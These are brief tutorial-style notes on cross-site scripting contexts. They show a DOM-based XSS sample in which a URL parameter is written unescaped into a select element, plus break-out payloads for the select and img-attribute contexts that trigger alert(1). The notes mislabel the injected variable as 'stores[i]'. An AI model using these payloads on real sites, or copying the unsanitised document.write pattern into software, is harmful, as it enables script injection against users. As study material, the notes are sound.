# XSS Context Examples
## \<select\>
```
<script>
  var stores = ["London","Paris","Milan"];
  var store = (new URLSearchParams(window.location.search)).get('storeId');
  document.write('<select name="storeId">');
  if(store) {
    document.write('<option selected>'+store+'</option>');
  }
  for(var i=0;i<stores.length;i++) {
    if(stores[i] === store) {
      continue;
    }
    
    document.write('<option>'+stores[i]+'</option>');
  }
  document.write('</select>');
</script>
```
A DOM-based XSS where `stores[i]` can be manipulated by the `storeId` URL parameter.

**Break out**: The `<select>` environment needs to be exited!
```
website.com?storeId=></select><img src=1 onerror=alert(1)>
```

## \<img\>
```
<img src="/resources?searchTerms=xxxx">
```
the following search term can be used to escape and trigger an alert:
```
"><svg onload=alert(1)>
```